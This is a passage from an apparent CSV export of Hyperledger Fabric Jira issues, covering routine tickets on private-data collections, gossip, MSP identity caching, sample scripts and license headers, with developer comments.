# ""Users""
# ---------------------------------------------------------------------------
#    Count: The number of user accounts _in addition_ to Admin
# ---------------------------------------------------------------------------
{code}

So what is this designed for?
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydqv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Aug/17 12:40 PM;davidkhala;Sorry, I found its just file caching problem, please ignore it;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
byfn e2e test spelling error,FAB-5858,20311,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,PuneetJoshi,TopJohn,TopJohn,21/Aug/17 6:02 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,21/Oct/17 4:41 AM,,,,,,fabric-samples,,,,,,0,,,,,,,"The byfn.sh has some spelling error.

Line 172: rm docker-compose-e2e.yamlt",,denyeart,PuneetJoshi,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydr3:",,,,,,,,,,,,,,,,,,,,,,,denyeart,PuneetJoshi,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Oct/17 4:41 AM;denyeart;Per comments in [https://gerrit.hyperledger.org/r/#/c/12633/] , this is actually correct and not a defect.  Closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add fabric-test repo to the Vagrant file ,FAB-5859,20313,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,21/Aug/17 11:41 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Sep/17 4:56 AM,,,,,,,,,,,,0,,,,,,,The fabric-test repo should be mounted in the vagrant file if it is present in one's environment.,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydrb:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix misusage in container/image management,FAB-5861,20315,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,22/Aug/17 12:00 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,08/Apr/18 11:32 AM,,,,,,fabric-peer,,,,,,0,,,,,,,"There're several misusages related to container/image concepts.

They are now mixed in the code with mistakes, like container/images, name/ids.

Need to fix to make the code more clear to follow.",,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydrj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Aug/17 10:49 AM;baohua;https://gerrit.hyperledger.org/r/#/c/12655/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement ack-based gossip Send(),FAB-5862,20316,18792,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,22/Aug/17 12:00 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Sep/17 10:43 PM,v1.0.1,v1.1.0,,v1.1.0,,fabric-gossip,,,,,,0,,,,,,,We need to implement an ack-based send for sideDB in order to ensure dissemination to at least K peers.,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydrr:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Define policies API needed for gossip ,FAB-5863,20317,18792,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,22/Aug/17 12:25 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Aug/17 8:25 PM,v1.0.1,,,,,fabric-gossip,,,,,,0,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydrz:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Aug/17 6:31 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/12657/;;;","29/Aug/17 6:58 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/12885/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Reconfigure membership in examples.,FAB-5864,20318,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,luomin,jyellick,jyellick,22/Aug/17 12:57 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,17/Nov/17 5:09 AM,,,,v1.1.0,,fabric-samples,,,,,,0,help-wanted,,,,,,"How to conduct channel membership changes is a frequently asked question.

The tools are all there, and there is some fragmented documentation around this, but the best way to document is through example.

It should be relatively straghtforward to enhance one of the examples to define three application organizations instead of 2, then create a channel with two members, and add the third.

This is an exercise that I've gone though by hand and would be happy to walk the implementer through.",,jyellick,luomin,smithbk,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6632,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyds7:",,,,Unset,,,,,,,3.0,Unset,,,,,,,,,,,jyellick,luomin,smithbk,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 4:47 AM;jyellick;[~luomin] How are you coming with this? Do you need any assistance?;;;","31/Aug/17 6:20 AM;luomin;Hi, [~jyellick], I am still working on this issue. 
 I am a beginner, so sorry for the delay. 
 And very appreciate if you could provide those ""fragmented documentation"" you have mentioned around this.;;;","31/Aug/17 8:17 AM;jyellick;Certainly, please take a look primarily at: 

https://github.com/hyperledger/fabric/tree/release/examples/configtxupdate

You may also find the following useful:

https://github.com/hyperledger/fabric/blob/release/docs/source/configtxgen.rst

Finally, and least usefully:

https://github.com/hyperledger/fabric/blob/release/docs/source/configtx.rst

Please also feel free to post questions here or to #fabric-consensus on RocketChat.;;;","09/Oct/17 10:48 PM;smithbk;What is the status of this?  Is there an example of adding a new org to an existing channel?;;;","10/Oct/17 9:54 AM;luomin;Hi, [~smithbk], I haven't complete the environment setting (playground) for adding the new org. Apology for the delay.

I may need 2-3 weeks before submitting my solution. If it is better to complete this issue in emergency, please feel free to transfer the Assignee role to others.;;;","17/Nov/17 5:09 AM;wlahti;Closing this work item in favor of https://jira.hyperledger.org/browse/FAB-6632, which is already in progress.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve consumability with CAR and chain-tools,FAB-5865,20319,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jimthematrix,jimthematrix,22/Aug/17 1:40 AM,23/Jan/20 7:03 AM,28/Oct/23 3:00 AM,23/Jan/20 7:03 AM,,,,Future,,fabric-peer,,,,,,0,stale-item,,,,,,,,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,288000,288000,,0%,288000,288000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzydsf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:03 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The order module has some repeat code.,FAB-5866,20321,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,TopJohn,TopJohn,TopJohn,22/Aug/17 1:43 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 1:47 PM,,,,,,fabric-orderer,,,,,,0,orderer,,,,,,The core/comm/server.go has repeated code at line 170 171.,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydsv:",,,,,,,,,,,,,,,,,,,,,,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make statedb validator to use bulkOptimization (for couchDB) to preload committed version of read set,FAB-5867,20322,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,22/Aug/17 8:40 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,02/Sep/17 12:24 AM,,,,v1.1.0,,fabric-ledger,,,,,,0,,,,,,,"Before validating each transaction in a block, statedb validator collects read set of all transactions in the block and preload the committed version of each key in the read sets into a cache. Then, the validator compares version of key in read set against committed version in cache while validating a transaction. This reduces the number of REST API calls between peer and CouchDB during validation to improve performance.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydt3:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Specify collection interface,FAB-5868,20324,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mne,elli-androulaki,elli-androulaki,22/Aug/17 9:59 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,28/Sep/17 9:11 PM,,,,,,fabric-peer,,,,,,0,,,,,,,"We need to specify a collection interface 
 * (chaincode side, validator side)
 * Should include initialisation function that takes as input potentially secretly distributed parameters
 * Should be generic enough to cover any unlinkability property we want to add (e.g. unlinkability of a collection identifier and its members)",,elli-androulaki,mne,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57600,57600,,0%,57600,57600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5082,,,,,,,,,"1|hzydtj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,mne,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Sep/17 11:45 PM;mne;CR [12757|https://gerrit.hyperledger.org/r/12757] is in review for this item;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement a base collection object satisfying the collection interface,FAB-5869,20325,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mne,elli-androulaki,elli-androulaki,22/Aug/17 10:00 PM,21/Jul/18 3:47 AM,28/Oct/23 3:00 AM,06/Oct/17 6:55 PM,,,,,,fabric-peer,,,,,,0,,,,,,,"Implementation of base collection object, an object with the following features:
 * Collection name is the same across all collection state updates
 * Collection access policies and access are publicly visible and validatable",,elli-androulaki,mne,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5082,,,,,,,,,"1|hzydtr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,mne,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Oct/17 9:25 PM;mne;[https://gerrit.hyperledger.org/r/#/c/14039/] has the corresponding code;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Configuration proto for a collection,FAB-5870,20326,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mathiasb303,elli-androulaki,elli-androulaki,22/Aug/17 10:03 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,28/Sep/17 8:30 PM,,,,,,fabric-peer,,,,,,0,,,,,,," Define collection configuration proto (passed at chaincode deploy time) to define:

 - peers who should be allowed to access private data associated to the collection

 - collection namespace within the chaincode

 - mim numbers of peers that a transient DB update associated to the collection should be communicated to at endorsement time

 ",,elli-androulaki,kchristidis,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57600,57600,,0%,57600,57600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5082,,,,,,,,,"1|hzydsn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,kchristidis,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Sep/17 11:43 PM;mastersingh24;I really think we need to define the minimum set of properties we need to set for a collection.

It seems that we have the following requirements:
- Collection name (and/or id)
- Orgs which will store the ""data"" for the collection
- Minimum number of nodes data where data needs to reside to be acked

As an aside, can someone explain what 
{noformat}
Generic enough to cover any unlinkability property that makes sense to be added later (e.g., via specifying a collection type)
{noformat}
means?;;;","22/Sep/17 12:20 AM;elli-androulaki;Hi [~mastersingh24], 

I updated the description of the JIRA item to map to the minimum requirements as you listed them.

Endorsement policy could make sense to be added here, but we can add it at a later point if/when we are all convinced that is needed.

This one:

 > Generic enough to cover any unlinkability property that makes sense to be added later (e.g., via specifying a collection type)

aimed to refer to alternative (future) implementations of collections that would allow for stronger privacy features. The base implementation of such object would be as described in the sideDB document (no question about that), but our idea was that users of fabric can plug in in the future alternative implementations if they wish to (e.g., support for more collection object types).;;;","28/Sep/17 8:31 PM;kchristidis;https://gerrit.hyperledger.org/r/c/13231/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create collection at chaincode instantiation time,FAB-5871,20327,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ales,elli-androulaki,elli-androulaki,22/Aug/17 10:08 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,22/Dec/17 7:50 AM,,,,,,fabric-peer,,,,,,0,,,,,,,"Integrate collection configuration with chaincode instantiation
 * Enhance chaincode deploy arguments to include collection configuration
 * Update the lscc instantiate validation with custom validation (Modification of ValidateLSCCInvocation)",,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,115200,115200,,0%,115200,115200,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11039,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5082,,,,,,,,,"1|hzydu7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Oct/17 12:02 AM;denyeart;[https://gerrit.hyperledger.org/r/#/c/14291/]

https://gerrit.hyperledger.org/r/#/c/14367/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement collection store,FAB-5872,20328,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ales,elli-androulaki,elli-androulaki,22/Aug/17 10:10 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,29/Oct/17 11:51 PM,,,,,,fabric-peer,,,,,,0,,,,,,,"Implement a collection store based on the interface defined by FAB-5868.
The collection store (formerly policy store) serves collection objects based on collection criteria.",,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5082,,,,,,,,,"1|hzydtz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Integrate collection object at transaction validation,FAB-5873,20329,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ales,elli-androulaki,elli-androulaki,22/Aug/17 10:11 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,30/Oct/17 12:04 AM,,,,,,fabric-crypto,,,,,,0,,,,,,,,,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,115200,115200,,0%,115200,115200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5082,,,,,,,,,"1|hzyduf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Oct/17 12:04 AM;denyeart;Done in other work items.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support for queries over pvt data,FAB-5874,20334,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,22/Aug/17 10:42 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 12:43 AM,,,,,,,,,,,,0,,,,,,,"In addition to the key based operations, provide support for the queries over the pvt data",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydun:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric-test: Behave framework--add capability for pausing and disconnecting a container in addition to stopping it,FAB-5875,20336,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,22/Aug/17 11:29 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,06/Sep/17 12:56 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,28800,28800,,0%,28800,28800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyduv:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,true,"06/Sep/17 12:56 AM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/12767/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
as a fabric developer I want the MSP to cache identity validation when possible,FAB-5880,20348,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,angelo.decaro,angelo.decaro,angelo.decaro,23/Aug/17 10:20 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,13/Oct/17 2:49 AM,v1.0.1,,,v1.1.0,,fabric-crypto,,,,,,1,MembershipServices,Security,,,,,"When an MSP identity is validated, its validity can be cached until an event does require the MSP to be updated. Before that, if the a validation is requested again on the same identity, the result stored in the cache can be return directly.

The same reasoning can be applied to MSP identity deserialisation and to MSP principals.

[~Senthil1],[~elli-androulaki],[~ales],[~yacovm],[~mastersingh24], please have your say,",,angelo.decaro,baohua,denyeart,mastersingh24,thakkarparth007,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6421,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzxy73:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,baohua,denyeart,mastersingh24,thakkarparth007,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Aug/17 6:32 PM;mastersingh24;@aso - This makes sense to me - especially when it comes to identities which use long-term enrollment credentials;;;","13/Oct/17 2:49 AM;denyeart;[https://gerrit.hyperledger.org/r/#/c/12681/] merged.;;;","07/Dec/17 4:02 PM;baohua;I guess this msp cache feature can be safely ported back to the 1.0.x version?

Any suggestion? I would like to offer a hand if no objection.

Thanks!;;;","07/Dec/17 7:37 PM;denyeart;[~baohua] Only bug fixes are backported.  Performance enhancements get delivered in next Fabric releases.  This one is merged in 1.1, and if you look at the number of lines of code, I think you'd agree that there are too many changes to safely backport in a bug fix release.;;;","07/Dec/17 11:27 PM;baohua;[~denyeart], agree.

If 1.1 will come out soon, we may leave the patchsets there, as 1.0 seems not LTS.

Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add license head for code and docs,FAB-5882,20351,18025,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,qiang0723,qiang0723,qiang0723,23/Aug/17 11:49 AM,23/Jan/20 7:03 AM,28/Oct/23 3:00 AM,23/Jan/20 7:03 AM,,,,,,,,,,,,0,stale-item,,,,,,,,qiang0723,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydxj:",,,,,,,,,,,,,,,,,,,,,,,qiang0723,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:03 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add license head for docs,FAB-5883,20352,18025,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,qiang0723,qiang0723,23/Aug/17 11:50 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,02/Sep/17 4:00 PM,,,,,,,,,,,,0,,,,,,,,,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydxr:",,,,,,,,,,,,,,,,,,,,,,,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
